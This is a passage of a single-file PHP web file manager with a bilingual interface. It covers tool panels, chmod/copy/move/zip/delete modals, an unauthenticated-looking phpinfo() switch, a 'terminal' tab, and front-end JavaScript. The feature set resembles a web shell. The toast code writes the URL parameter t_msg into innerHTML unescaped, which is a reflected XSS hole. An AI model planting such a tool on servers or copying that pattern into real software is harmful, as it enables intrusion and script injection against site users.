        <a href="?dir=<?=$eDir?>&phpinfo=1<?=$lp?>" target="_blank" class="btn btn-v"><i class="fa-brands fa-php"></i> <?=$t['open_tool']?> phpinfo()</a>
      </div>
    </div>
  </div>

  <!-- TOOL: CRON BUILDER -->
  <div id="tool-cron" class="tool-panel">
    <div class="tool-section">
      <div class="tool-section-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-clock-rotate-left"></i></div><span class="panel-hdr-title"><?=$t['tool_cron']?></span></div>
      <div class="tool-section-body">
        <div style="display:grid;grid-template-columns:repeat(5,1fr);gap:8px">
          <?php
          $cronFields=[
              'minute'     =>['label'=>'Minute','ph'=>'0-59 or *','tip'=>'0=top of hour, */5=every 5min'],
              'hour'       =>['label'=>'Hour','ph'=>'0-23 or *','tip'=>'0=midnight, 12=noon'],
              'day_month'  =>['label'=>'Day (Month)','ph'=>'1-31 or *','tip'=>'Day of month'],
              'month'      =>['label'=>'Month','ph'=>'1-12 or *','tip'=>'1=Jan, 12=Dec'],
              'day_week'   =>['label'=>'Day (Week)','ph'=>'0-6 or *','tip'=>'0=Sun, 6=Sat'],
          ];
          foreach($cronFields as $fk=>$fv):?>
          <div>
            <div style="font-size:.65rem;color:var(--dim);margin-bottom:4px;font-weight:700"><?=$fv['label']?></div>
            <input type="text" id="cron-<?=$fk?>" class="field-sm" placeholder="<?=$fv['ph']?>" oninput="buildCron()" title="<?=$fv['tip']?>" value="*">
          </div>
          <?php endforeach;?>
        </div>
        <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
          <div class="tool-result" id="cronOutput" style="flex:1;min-height:auto;padding:10px 14px;font-size:.9rem">* * * * *</div>
          <button class="copy-btn" onclick="copyText('cronOutput')" style="padding:6px 12px">Copy</button>
        </div>
        <div style="font-size:.72rem;color:var(--dim)">
          <strong style="color:var(--v3)"><?=$lang==='id'?'Preset:':'Presets:'?></strong>
        </div>
        <div style="display:flex;gap:6px;flex-wrap:wrap">
          <?php
          $presets=[
              '* * * * *'     =>$lang==='id'?'Setiap menit':'Every minute',
              '0 * * * *'     =>$lang==='id'?'Setiap jam':'Every hour',
              '0 0 * * *'     =>$lang==='id'?'Setiap hari tengah malam':'Daily midnight',
              '0 0 * * 0'     =>$lang==='id'?'Setiap Minggu':'Every Sunday',
              '0 0 1 * *'     =>$lang==='id'?'Setiap awal bulan':'Monthly',
              '*/5 * * * *'   =>$lang==='id'?'Setiap 5 menit':'Every 5 min',
              '0 9-17 * * 1-5'=>$lang==='id'?'Jam kerja':'Business hours',
          ];
          foreach($presets as $pv=>$pl):?>
          <button class="btn btn-ghost" style="font-size:.7rem;padding:4px 10px" onclick="setCron('<?=$pv?>')"><?=$pl?></button>
          <?php endforeach;?>
        </div>
        <div id="cronDesc" style="font-size:.76rem;color:var(--c2);background:var(--bg);border:1px solid var(--b2);border-radius:var(--rads);padding:9px 13px;"></div>
      </div>
    </div>
  </div>

  <!-- TOOL: UUID GENERATOR -->
  <div id="tool-uuid" class="tool-panel">
    <div class="tool-section">
      <div class="tool-section-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-fingerprint"></i></div><span class="panel-hdr-title"><?=$t['tool_uuid']?></span></div>
      <div class="tool-section-body">
        <div class="tool-row">
          <span class="tool-label"><?=$lang==='id'?'Jumlah UUID':'Number of UUIDs'?></span>
          <input type="number" id="uuidCount" class="field-sm" value="1" min="1" max="20" style="flex:none;width:80px">
          <button class="btn btn-v" onclick="doUUID()"><i class="fa-solid fa-fingerprint"></i> <?=$t['generate']?></button>
        </div>
        <div id="uuidResult" class="tool-result">—</div>
        <button class="copy-btn" onclick="copyText('uuidResult')" style="margin-top:8px"><?=$t['copy_to_clipboard']?></button>
      </div>
    </div>
  </div>

  <!-- TOOL: URL ENCODER/DECODER -->
  <div id="tool-urlenc" class="tool-panel">
    <div class="tool-section">
      <div class="tool-section-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-link"></i></div><span class="panel-hdr-title"><?=$t['tool_urlenc']?></span></div>
      <div class="tool-section-body">
        <div>
          <div style="font-size:.72rem;color:var(--dim);margin-bottom:5px"><?=$t['input']?></div>
          <textarea id="urlencInput" class="field" style="height:100px" placeholder="Enter text or URL..."></textarea>
        </div>
        <div style="display:flex;gap:8px;flex-wrap:wrap">
          <button class="btn btn-v" onclick="doUrlEnc('encode')"><i class="fa-solid fa-lock"></i> <?=$t['encode']?></button>
          <button class="btn btn-c" onclick="doUrlEnc('decode')"><i class="fa-solid fa-unlock"></i> <?=$t['decode']?></button>
          <button class="btn btn-ghost" onclick="copyText('urlencResult')">Copy</button>
        </div>
        <div>
          <div style="font-size:.72rem;color:var(--dim);margin-bottom:5px;display:flex;align-items:center;gap:7px"><?=$t['output']?> <button class="copy-btn" onclick="copyText('urlencResult')">copy</button></div>
          <div class="tool-result" id="urlencResult">—</div>
        </div>
      </div>
    </div>
  </div>

  <!-- TOOL: TEXT STATISTICS -->
  <div id="tool-textstats" class="tool-panel">
    <div class="tool-section">
      <div class="tool-section-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-rectangle-list"></i></div><span class="panel-hdr-title"><?=$t['tool_textstats']?></span></div>
      <div class="tool-section-body">
        <div>
          <div style="font-size:.72rem;color:var(--dim);margin-bottom:5px"><?=$t['input']?></div>
          <textarea id="statsInput" class="field" style="height:120px" placeholder="Enter text to analyze..." oninput="doTextStats()"></textarea>
        </div>
        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:10px;margin-top:10px">
          <div>
            <div style="font-size:.7rem;color:var(--dim);margin-bottom:3px"><?=$lang==='id'?'Karakter':'Characters'?></div>
            <div class="tool-result" id="stat-chars" style="min-height:auto;padding:8px;font-size:1rem;font-weight:600">0</div>
          </div>
          <div>
            <div style="font-size:.7rem;color:var(--dim);margin-bottom:3px"><?=$lang==='id'?'Karakter (no space)':'Chars (no space)'?></div>
            <div class="tool-result" id="stat-charsnospace" style="min-height:auto;padding:8px;font-size:1rem;font-weight:600">0</div>
          </div>
          <div>
            <div style="font-size:.7rem;color:var(--dim);margin-bottom:3px"><?=$lang==='id'?'Kata':'Words'?></div>
            <div class="tool-result" id="stat-words" style="min-height:auto;padding:8px;font-size:1rem;font-weight:600">0</div>
          </div>
          <div>
            <div style="font-size:.7rem;color:var(--dim);margin-bottom:3px"><?=$lang==='id'?'Baris':'Lines'?></div>
            <div class="tool-result" id="stat-lines" style="min-height:auto;padding:8px;font-size:1rem;font-weight:600">0</div>
          </div>
          <div>
            <div style="font-size:.7rem;color:var(--dim);margin-bottom:3px"><?=$lang==='id'?'Kalimat':'Sentences'?></div>
            <div class="tool-result" id="stat-sentences" style="min-height:auto;padding:8px;font-size:1rem;font-weight:600">0</div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- TOOL: PASSWORD GENERATOR -->
  <div id="tool-passgen" class="tool-panel">
    <div class="tool-section">
      <div class="tool-section-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-shield-halved"></i></div><span class="panel-hdr-title"><?=$t['tool_passgen']?></span></div>
      <div class="tool-section-body">
        <div class="tool-row">
          <span class="tool-label"><?=$lang==='id'?'Panjang':'Length'?></span>
          <input type="number" id="passLen" class="field-sm" value="16" min="8" max="64" style="flex:none;width:80px">
          <label style="display:flex;align-items:center;gap:5px;flex:1;margin-left:10px">
            <input type="checkbox" id="passSpecial" checked>
            <span style="font-size:.72rem"><?=$lang==='id'?'Karakter spesial':'Special chars'?></span>
          </label>
        </div>
        <button class="btn btn-v" onclick="doPassGen()" style="width:100%"><i class="fa-solid fa-shuffle"></i> <?=$t['generate']?></button>
        <div>
          <div style="font-size:.72rem;color:var(--dim);margin:10px 0 5px 0;display:flex;align-items:center;gap:7px"><?=$t['result']?> <button class="copy-btn" onclick="copyText('passResult')">copy</button></div>
          <div class="tool-result" id="passResult">—</div>
        </div>
      </div>
    </div>
  </div>

  <!-- TOOL: TIMESTAMP CONVERTER -->
  <div id="tool-timestamp" class="tool-panel">
    <div class="tool-section">
      <div class="tool-section-hdr"><div class="panel-hdr-icon"><i class="fa-solid fa-calendar-days"></i></div><span class="panel-hdr-title"><?=$t['tool_timestamp']?></span></div>
      <div class="tool-section-body">
        <div style="display:flex;gap:10px;margin-bottom:10px">
          <label style="display:flex;align-items:center;gap:5px;flex:1">
            <input type="radio" name="tsOp" value="todate" onchange="updateTsOp()" checked>
            <span style="font-size:.72rem"><?=$lang==='id'?'Timestamp → Tanggal':'Timestamp → Date'?></span>
          </label>
          <label style="display:flex;align-items:center;gap:5px;flex:1">
            <input type="radio" name="tsOp" value="totimestamp" onchange="updateTsOp()">
            <span style="font-size:.72rem"><?=$lang==='id'?'Tanggal → Timestamp':'Date → Timestamp'?></span>
          </label>
        </div>
        <div class="tool-row">
          <input type="text" id="tsInput" class="field" placeholder="2025-04-22 15:30:00 or 1734891600" style="width:100%">
        </div>
        <button class="btn btn-v" onclick="doTimestamp()" style="width:100%"><i class="fa-solid fa-arrow-right-arrow-left"></i> <?=$lang==='id'?'Konversi':'Convert'?></button>
        <div>
          <div style="font-size:.72rem;color:var(--dim);margin:10px 0 5px 0;display:flex;align-items:center;gap:7px"><?=$t['result']?> <button class="copy-btn" onclick="copyText('tsResult')">copy</button></div>
          <div class="tool-result" id="tsResult">—</div>
        </div>
      </div>
    </div>
  </div>

</div><!-- /tab-tools -->

</div><!-- /wrap -->

<?php
// phpinfo output
if(isset($_GET['phpinfo'])){
    phpinfo();
    exit;
}
?>

<!-- MODALS -->
<div class="modal-overlay" id="permModal">
  <div class="modal">
    <div class="modal-title"><i class="fa-solid fa-lock"></i> <?=$t['perm_title']?></div>
    <form method="post" action="?dir=<?=$eDir?>&tab=files<?=$lp?>">
      <div class="modal-body">
        <div style="font-size:.8rem;color:var(--dim)"><?=$t['perm_file']?>: <span id="permFileNameDisplay" style="color:var(--txt);font-weight:600;font-family:'Fira Code',monospace"></span></div>
        <input type="hidden" name="perm_file" id="permFileName">
        <div class="input-group"><label><?=$t['perm_mode']?></label><input type="text" name="permissions" id="permValue" class="field-sm" placeholder="755" maxlength="4" style="flex:none;width:90px"></div>
        <div style="display:flex;gap:5px;flex-wrap:wrap">
          <?php foreach(['755'=>'755','644'=>'644','777'=>'777','600'=>'600','400'=>'400'] as $v=>$l):?>
          <button type="button" class="btn btn-ghost" style="font-size:.7rem;padding:4px 10px" onclick="document.getElementById('permValue').value='<?=$v?>'"><?=$l?></button>
          <?php endforeach;?>
        </div>
      </div>
      <div class="modal-footer">
        <button type="submit" name="change_perms" class="btn btn-v"><i class="fa-solid fa-check"></i> <?=$t['apply']?></button>
        <button type="button" class="btn btn-ghost" onclick="closeModal('permModal')"><?=$t['cancel']?></button>
      </div>
    </form>
  </div>
</div>

<div class="modal-overlay" id="copyMoveModal">
  <div class="modal">
    <div class="modal-title"><i class="fa-solid fa-arrows-up-down-left-right"></i> <?=$t['cm_title']?></div>
    <div class="modal-body">
      <div style="font-size:.8rem;color:var(--dim)"><?=$t['cm_file']?>: <span id="cmFileName" style="color:var(--txt);font-weight:600;font-family:'Fira Code',monospace"></span></div>
      <form method="post" action="?dir=<?=$eDir?>&tab=files<?=$lp?>" id="copyForm">
        <input type="hidden" name="copy_src" id="copySrc">
        <div style="display:flex;gap:7px;align-items:center;margin-top:7px">
          <label style="font-size:.72rem;color:var(--dim);min-width:75px"><?=$t['cm_dest']?></label>
          <input type="text" name="copy_dest" class="field-sm" placeholder="<?=htmlspecialchars((string)$root_dir)?>" style="flex:1">
        </div>
        <div style="margin-top:10px;display:flex;justify-content:flex-end"><button type="submit" name="copy_file" class="btn btn-c"><i class="fa-solid fa-copy"></i> <?=$t['copy_here']?></button></div>
      </form>
      <hr style="border-color:var(--b1);margin:9px 0">
      <form method="post" action="?dir=<?=$eDir?>&tab=files<?=$lp?>" id="moveForm">
        <input type="hidden" name="move_src" id="moveSrc">
        <div style="display:flex;gap:7px;align-items:center">
          <label style="font-size:.72rem;color:var(--dim);min-width:75px"><?=$t['cm_dest']?></label>
          <input type="text" name="move_dest" class="field-sm" placeholder="<?=htmlspecialchars((string)$root_dir)?>" style="flex:1">
        </div>
        <div style="margin-top:10px;display:flex;gap:7px;justify-content:flex-end">
          <button type="submit" name="move_file" class="btn btn-v"><i class="fa-solid fa-truck-fast"></i> <?=$t['move_here']?></button>
          <button type="button" class="btn btn-ghost" onclick="closeModal('copyMoveModal')"><?=$t['cancel']?></button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- FIX: Extract modal - action menggunakan dir yang benar -->
<div class="modal-overlay" id="extractModal">
  <div class="modal">
    <div class="modal-title"><i class="fa-solid fa-box-archive"></i> <?=$t['extract_zip']?></div>
    <form method="post" action="?dir=<?=$eDir?>&tab=files<?=$lp?>">
      <input type="hidden" name="zip_file" id="extractZipFile">
      <div class="modal-body">
        <div style="font-size:.8rem;color:var(--dim)"><?=$lang==='id'?'File ZIP':'ZIP File'?>: <span id="extractZipName" style="color:var(--v3);font-family:'Fira Code',monospace;font-weight:600"></span></div>
        <div style="font-size:.76rem;color:var(--dim);background:var(--s3);padding:9px 13px;border-radius:var(--rads);border:1px solid var(--b1);">
          <i class="fa-solid fa-circle-info" style="color:var(--v2)"></i>
          <?=$lang==='id'?'Akan diekstrak ke folder dengan nama yang sama di direktori ini.':'Will be extracted to a same-named folder in this directory.'?>
        </div>
        <div style="font-size:.72rem;color:var(--mute)"><i class="fa-solid fa-folder"></i> <?=$lang==='id'?'Direktori target:':'Target directory:'?> <code style="color:var(--c2)"><?=htmlspecialchars($current_dir)?></code></div>
      </div>
      <div class="modal-footer">
        <button type="submit" name="extract_zip" class="btn btn-v"><i class="fa-solid fa-box-archive"></i> <?=$t['extract']?></button>
        <button type="button" class="btn btn-ghost" onclick="closeModal('extractModal')"><?=$t['cancel']?></button>
      </div>
    </form>
  </div>
</div>

<div class="modal-overlay" id="bulkZipModal">
  <div class="modal">
    <div class="modal-title"><i class="fa-solid fa-file-zipper"></i> <?=$t['bulk_zip_title']?></div>
    <form method="post" action="?dir=<?=$eDir?>&tab=zip<?=$lp?>">
      <div class="modal-body">
        <div style="display:flex;gap:7px;align-items:center">
          <label style="font-size:.72rem;color:var(--dim);min-width:75px"><?=$t['bulk_zip_name']?></label>
          <input type="text" name="zip_name" class="field-sm" placeholder="archive.zip" style="flex:1">
        </div>
        <div id="bulkZipFiles" style="font-size:.75rem;color:var(--dim);max-height:150px;overflow-y:auto;padding:7px;background:var(--bg);border:1px solid var(--b2);border-radius:var(--rads)"></div>
      </div>
      <div class="modal-footer">
        <button type="submit" name="create_zip" class="btn btn-v"><i class="fa-solid fa-file-zipper"></i> <?=$t['make_zip']?></button>
        <button type="button" class="btn btn-ghost" onclick="closeModal('bulkZipModal')"><?=$t['cancel']?></button>
      </div>
    </form>
  </div>
</div>

<div class="confirm-modal-overlay" id="confirmModal">
  <div class="confirm-box">
    <div class="confirm-icon-wrap del"><i class="fa-solid fa-trash-can"></i></div>
    <div class="confirm-title" id="confirmTitle"><?=$lang==='id'?'Konfirmasi Hapus':'Confirm Delete'?></div>
    <div class="confirm-msg" id="confirmMsg"><?=$lang==='id'?'Apakah Anda yakin ingin menghapus:':'Are you sure you want to delete:'?></div>
    <div class="confirm-file" id="confirmFile"></div>
    <div class="confirm-footer">
      <a id="confirmYesBtn" href="#" class="btn btn-r"><i class="fa-solid fa-trash"></i> <?=$lang==='id'?'Ya, Hapus':'Yes, Delete'?></a>
      <button class="btn btn-ghost" onclick="closeConfirm()"><i class="fa-solid fa-xmark"></i> <?=$t['cancel']?></button>
    </div>
  </div>
</div>

<div id="tc"></div>

<script>
const LANG = '<?=$lang?>';
const CURRENT_DIR = '<?=$js_current_dir?>';
const ROOT_DIR    = '<?=$js_root_dir?>';
const LP = '<?=addslashes($lp)?>';

const I18N = {
  bulkSelected: '<?=addslashes($t['bulk_selected'])?>',
  toastSuccess: '<?=addslashes($t['toast_success'])?>',
  toastError:   '<?=addslashes($t['toast_error'])?>',
  confirmTitle: LANG==='id' ? 'Konfirmasi Hapus' : 'Confirm Delete',
  confirmMsg:   LANG==='id' ? 'Apakah Anda yakin ingin menghapus:' : 'Are you sure you want to delete:',
  yesDelete:    LANG==='id' ? 'Ya, Hapus' : 'Yes, Delete',
  cancel:       LANG==='id' ? 'Batal' : 'Cancel',
};

// ── TOAST ──
(function(){
  const p=new URLSearchParams(location.search);
  const type=p.get('t_type'),msg=p.get('t_msg');
  if(!type||!msg)return;
  const np=new URLSearchParams(location.search);
  np.delete('t_type');np.delete('t_msg');
  history.replaceState(null,'','?'+np.toString());
  showToast(type,decodeURIComponent(msg));
})();

function showToast(type,msg,dur=5000){
  const isOk=type==='success';
  const el=document.createElement('div');
  el.className='toast '+(isOk?'toast-ok':'toast-err');
  el.style.setProperty('--dur',(dur/1000)+'s');
  el.innerHTML=`<div class="toast-stripe"></div><div class="toast-inner"><div class="toast-ico"><i class="fa-solid ${isOk?'fa-circle-check':'fa-circle-xmark'}"></i></div><div class="toast-content"><div class="toast-title">${isOk?I18N.toastSuccess:I18N.toastError}</div><div class="toast-msg">${msg}</div></div></div><button class="toast-x"><i class="fa-solid fa-xmark"></i></button><div class="tbar"></div>`;
  document.getElementById('tc').appendChild(el);
  let gone=false;
  function dismiss(){if(gone)return;gone=true;el.classList.add('hiding');el.addEventListener('animationend',()=>el.remove(),{once:true});}
  el.querySelector('.toast-x').addEventListener('click',e=>{e.stopPropagation();dismiss();});
  setTimeout(dismiss,dur);
}

// ── CONFIRM DELETE ──
function confirmDelete(type,name,url){
  document.getElementById('confirmTitle').textContent=I18N.confirmTitle;
  document.getElementById('confirmMsg').textContent=I18N.confirmMsg;
  document.getElementById('confirmFile').textContent=name;
  const btn=document.getElementById('confirmYesBtn');
  btn.href=url;btn.onclick=null;
  btn.innerHTML='<i class="fa-solid fa-trash"></i> '+I18N.yesDelete;
  document.getElementById('confirmModal').classList.add('active');
}
function closeConfirm(){document.getElementById('confirmModal').classList.remove('active');}
document.getElementById('confirmModal').addEventListener('click',function(e){if(e.target===this)closeConfirm();});

// ── TAB SWITCHING ──
const TAB_MAP={files:0,upload:1,create:2,zip:3,search:4,terminal:5,tools:6};

function switchTab(name){
  document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  const content=document.getElementById('tab-'+name);
  if(content)content.classList.add('active');
  const idx=TAB_MAP[name]??0;
  const tabEls=document.querySelectorAll('.tab');
  if(tabEls[idx])tabEls[idx].classList.add('active');
  const url=new URL(location.href);
  url.searchParams.set('tab',name);
  if(name!=='files'){url.searchParams.delete('edit');url.searchParams.delete('rename');}
  history.replaceState({tab:name},'','?'+url.searchParams.toString());
  if(name==='terminal') setTimeout(()=>{document.getElementById('cmdInput')?.focus();},80);
}

window.addEventListener('popstate',function(e){
  if(e.state&&e.state.tab){
    document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
    const c=document.getElementById('tab-'+e.state.tab);
    if(c)c.classList.add('active');
    const idx=TAB_MAP[e.state.tab]??0;
    const tabBtns=document.querySelectorAll('.tab');
    if(tabBtns[idx])tabBtns[idx].classList.add('active');
  }
});

// ── FILE UPLOAD DROP ──
function handleFileChange(input){
  const drop=document.getElementById('fileDrop');
  const label=document.getElementById('fileName');
  if(input.files&&input.files.length>0){
    const names=Array.from(input.files).map(f=>f.name);
    label.textContent=names.length>1?names.length+' file: '+names.slice(0,3).join(', ')+(names.length>3?'…':''):names[0];
    drop.classList.add('has-file');
  }else{
    label.textContent=LANG==='id'?'Klik atau seret & lepas file di sini...':'Click or drag & drop files here...';
    drop.classList.remove('has-file');
  }
}
(function(){
  const drop=document.getElementById('fileDrop');
  if(!drop)return;
  ['dragenter','dragover'].forEach(ev=>drop.addEventListener(ev,e=>{e.preventDefault();drop.classList.add('drag-over');}));
  ['dragleave','dragend','drop'].forEach(ev=>drop.addEventListener(ev,()=>drop.classList.remove('drag-over')));
  drop.addEventListener('drop',e=>{e.preventDefault();const inp=document.getElementById('fileInput');if(e.dataTransfer.files.length){inp.files=e.dataTransfer.files;handleFileChange(inp);}});
})();

// ── BULK SELECT ──
function toggleSelectAll(cb){document.querySelectorAll('.row-cb:not(#selectAll)').forEach(c=>{c.checked=cb.checked;updateRowHighlight(c);});updateBulkBar();}
function updateRowHighlight(cb){const row=cb.closest('tr');if(row)row.classList.toggle('selected',cb.checked);}
function updateBulkBar(){
  const checked=document.querySelectorAll('.row-cb:not(#selectAll):checked');
  document.getElementById('bulkCount').textContent=checked.length+' '+I18N.bulkSelected;
  document.getElementById('bulkBar').classList.toggle('active',checked.length>0);
}
document.addEventListener('change',function(e){if(e.target.classList.contains('row-cb')&&e.target.id!=='selectAll'){updateRowHighlight(e.target);updateBulkBar();}});
function getSelectedFiles(){return Array.from(document.querySelectorAll('.row-cb:not(#selectAll):checked')).map(c=>c.value);}
function clearSelection(){document.querySelectorAll('.row-cb').forEach(c=>{c.checked=false;});document.querySelectorAll('tr.selected').forEach(r=>r.classList.remove('selected'));document.getElementById('selectAll').checked=false;updateBulkBar();}
function bulkDelete(){const files=getSelectedFiles();if(!files.length){showToast('error',LANG==='id'?'Pilih minimal satu file':'Select at least one file');return;}confirmBulkDelete(files);}
function confirmBulkDelete(files){
  document.getElementById('confirmTitle').textContent=I18N.confirmTitle;
  document.getElementById('confirmMsg').textContent=LANG==='id'?'Hapus '+files.length+' item?':'Delete '+files.length+' items?';
  document.getElementById('confirmFile').textContent=files.slice(0,3).join(', ')+(files.length>3?'…':'');
  const btn=document.getElementById('confirmYesBtn');
  btn.href='#';
  btn.onclick=function(e){
    e.preventDefault();closeConfirm();
    const eDir=encodeURIComponent(CURRENT_DIR);
    let done=0;
    files.forEach(f=>{fetch('?dir='+eDir+'&delete='+encodeURIComponent(f)+LP).then(()=>{done++;if(done===files.length)location.reload();}).catch(()=>{done++;if(done===files.length)location.reload();});});
  };
  document.getElementById('confirmModal').classList.add('active');
}
function openBulkZipModal(){
  const files=getSelectedFiles();
  if(!files.length){showToast('error',LANG==='id'?'Pilih minimal satu file':'Select at least one file');return;}
  const cont=document.getElementById('bulkZipFiles');
  cont.innerHTML=files.map(f=>`<input type="hidden" name="zip_files[]" value="${f.replace(/"/g,'&quot;')}"><div style="padding:2px 0;display:flex;align-items:center;gap:5px"><i class="fa-solid fa-file" style="color:var(--v2);font-size:.75rem"></i><span style="font-size:.76rem">${f}</span></div>`).join('');
  openModal('bulkZipModal');
}

// ── MODALS ──
function openModal(id){document.getElementById(id).classList.add('active');}
function closeModal(id){document.getElementById(id).classList.remove('active');}
document.querySelectorAll('.modal-overlay').forEach(m=>{m.addEventListener('click',e=>{if(e.target===m)m.classList.remove('active');});});
function openPermModal(name,perms){document.getElementById('permFileName').value=name;document.getElementById('permFileNameDisplay').textContent=name;document.getElementById('permValue').value=perms;openModal('permModal');}
function openCopyMoveModal(name){document.getElementById('cmFileName').textContent=name;document.getElementById('copySrc').value=name;document.getElementById('moveSrc').value=name;openModal('copyMoveModal');}
function openExtractModal(name){document.getElementById('extractZipFile').value=name;document.getElementById('extractZipName').textContent=name;openModal('extractModal');}

// ── EDITOR ──
function editorTab(e){
  if(e.key==='Tab'){e.preventDefault();const ta=e.target,s=ta.selectionStart,end=ta.selectionEnd;ta.value=ta.value.substring(0,s)+'    '+ta.value.substring(end);ta.selectionStart=ta.selectionEnd=s+4;}
  if((e.ctrlKey||e.metaKey)&&e.key==='s'){e.preventDefault();document.getElementById('editorForm')?.submit();}
}

// ── SERVER CLOCK ──
(function(){
  const el=document.getElementById('server-clock');
  if(!el)return;
  let now=new Date('<?=date('Y-m-d\TH:i:s')?>');
  setInterval(()=>{
    now=new Date(now.getTime()+1000);
    const locale=LANG==='id'?'id-ID':'en-GB';
    el.textContent=now.toLocaleDateString(locale,{day:'2-digit',month:'short',year:'numeric'})+' '+now.toLocaleTimeString(locale);
  },1000);
})();

// ── TOOL PANEL TOGGLE ──
function toggleToolPanel(id){
  const panels=document.querySelectorAll('.tool-panel');
  panels.forEach(p=>{
    if(p.id===id) p.classList.toggle('active');
    else p.classList.remove('active');
  });
  // Scroll to panel
  const target=document.getElementById(id);
  if(target&&target.classList.contains('active')){
    setTimeout(()=>target.scrollIntoView({behavior:'smooth',block:'nearest'}),50);
  }
}

// ── COPY TEXT ──
function copyText(id){
  const el=document.getElementById(id);
  if(!el)return;
  const txt=el.tagName==='TEXTAREA'||el.tagName==='INPUT'?el.value:el.textContent;
  navigator.clipboard.writeText(txt).then(()=>showToast('success',LANG==='id'?'Tersalin ke clipboard!':'Copied to clipboard!')).catch(()=>{});
}

// ── HASH GENERATOR ──
async function doHash(){
  const txt=document.getElementById('hashInput').value;
  if(!txt){showToast('error','Input cannot be empty');return;}
  const fd=new FormData();
  fd.append('tool_hash','1');
  fd.append('hash_input',txt);
  const r=await fetch(location.href,{method:'POST',body:fd});
  const d=await r.json();
  document.getElementById('hashResult').style.display='flex';
  for(const k of['md5','sha1','sha256','sha512']){
    const el=document.getElementById('hash-'+k);
    if(el&&d[k]) el.textContent=d[k];
  }
}

// ── BASE64 ──
function doB64(mode){
  const inp=document.getElementById('b64Input').value;
  const out=document.getElementById('b64Output');
  if(!inp){out.textContent='—';return;}
  try{
    if(mode==='enc') out.textContent=btoa(unescape(encodeURIComponent(inp)));
    else out.textContent=decodeURIComponent(escape(atob(inp)));
  }catch(e){out.textContent='Error: '+e.message;}
}

// ── JSON FORMATTER ──
function doJson(mode){
  const inp=document.getElementById('jsonInput').value;
  const out=document.getElementById('jsonOutput');
  const status=document.getElementById('jsonStatus');
  try{
    const parsed=JSON.parse(inp);
    if(mode==='format'){
      out.textContent=JSON.stringify(parsed,null,2);
      status.innerHTML='<span style="color:var(--g)"><i class="fa-solid fa-check-circle"></i> Valid JSON</span>';
    } else {
      out.textContent=JSON.stringify(parsed);
      status.innerHTML='<span style="color:var(--g)"><i class="fa-solid fa-check-circle"></i> Valid JSON (minified)</span>';
    }
  }catch(e){
    out.textContent='Parse error: '+e.message;
    status.innerHTML='<span style="color:var(--r)"><i class="fa-solid fa-circle-xmark"></i> Invalid JSON</span>';
  }
}

// ── REGEX TESTER ──
async function doRegex(){
  const pattern=document.getElementById('regexPattern').value;
  const subject=document.getElementById('regexSubject').value;
  const out=document.getElementById('regexResult');
  if(!pattern){out.textContent='Enter a pattern';return;}
  const fd=new FormData();
  fd.append('tool_regex','1');
  fd.append('regex_pattern',pattern);
  fd.append('regex_subject',subject);
  try{
    const r=await fetch(location.href,{method:'POST',body:fd});
    const d=await r.json();
    if(d.error){out.textContent='Error: '+d.error;return;}
    if(d.count===0){
      out.textContent='<?=addslashes($t['no_match'])?>';
    } else {
      out.textContent=d.count+' <?=addslashes($t['matches'])?>:\n'+d.matches.join('\n');
    }
  }catch(e){out.textContent='Request error: '+e.message;}
}

// ── HTPASSWD ──
async function doHtpasswd(){
  const user=document.getElementById('htUser').value;
  const pass=document.getElementById('htPass').value;
  const out=document.getElementById('htResult');
  if(!user||!pass){showToast('error',LANG==='id'?'Username dan password harus diisi':'Username and password required');return;}
  const fd=new FormData();
  fd.append('tool_htpasswd','1');
  fd.append('ht_user',user);
  fd.append('ht_pass',pass);
  try{
    const r=await fetch(location.href,{method:'POST',body:fd});
    const d=await r.json();
    if(d.error){out.textContent='Error: '+d.error;return;}
    out.textContent=d.line;
    showToast('success',LANG==='id'?'Hash berhasil digenerate':'Hash generated successfully');
  }catch(e){out.textContent='Error: '+e.message;}
}
function toggleHtPass(){
  const inp=document.getElementById('htPass');
  const icon=document.getElementById('htEyeIcon');
  if(inp.type==='password'){inp.type='text';icon.className='fa-solid fa-eye-slash';}
  else{inp.type='password';icon.className='fa-solid fa-eye';}
}

// ── IMAGE CONVERTER ──
async function doImgConv(e){
  e.preventDefault();
  const file=document.getElementById('imgFile').files[0];
  if(!file){showToast('error','Select an image first');return;}
  const fd=new FormData();
  fd.append('tool_imgconv','1');
  fd.append('img_file',file);
  fd.append('img_fmt',document.getElementById('imgFmt').value);
  fd.append('img_q',document.getElementById('imgQuality').value);
  fd.append('img_w',document.getElementById('imgW').value||'0');
  fd.append('img_h',document.getElementById('imgH').value||'0');
  try{
    const r=await fetch(location.href,{method:'POST',body:fd});
    const d=await r.json();
    if(d.error){showToast('error',d.error);return;}
    const src='data:'+d.mime+';base64,'+d.base64;
    document.getElementById('imgConvPreview').src=src;
    document.getElementById('imgConvInfo').textContent=d.w+'×'+d.h+' px · '+d.mime;
    const dl=document.getElementById('imgConvDownload');
    dl.href=src;
    dl.download='converted.'+document.getElementById('imgFmt').value;
    document.getElementById('imgConvResult').style.display='block';
    showToast('success',LANG==='id'?'Konversi berhasil':'Conversion successful');
  }catch(e){showToast('error','Error: '+e.message);}
}

// ── CHMOD CALC ──
function calcChmod(){
  let oct='';
  for(const grp of['o','g','t']){
    let val=0;
    document.querySelectorAll(`.chmod-cb[data-grp="${grp}"]`).forEach(cb=>{if(cb.checked)val+=parseInt(cb.dataset.val);});
    oct+=val;
  }
  document.getElementById('chmodResult').textContent=oct;
}
function setChmod(oct){
  const vals=oct.split('').map(Number);
  const grps=['o','g','t'];
  grps.forEach((grp,gi)=>{
    const v=vals[gi];
    document.querySelectorAll(`.chmod-cb[data-grp="${grp}"]`).forEach(cb=>{
      cb.checked=!!(v&parseInt(cb.dataset.val));
    });
  });
  document.getElementById('chmodResult').textContent=oct;
}

// ── CRON BUILDER ──
function buildCron(){
  const fields=['minute','hour','day_month','month','day_week'];
  const parts=fields.map(f=>(document.getElementById('cron-'+f)?.value||'*').trim()||'*');
  const expr=parts.join(' ');
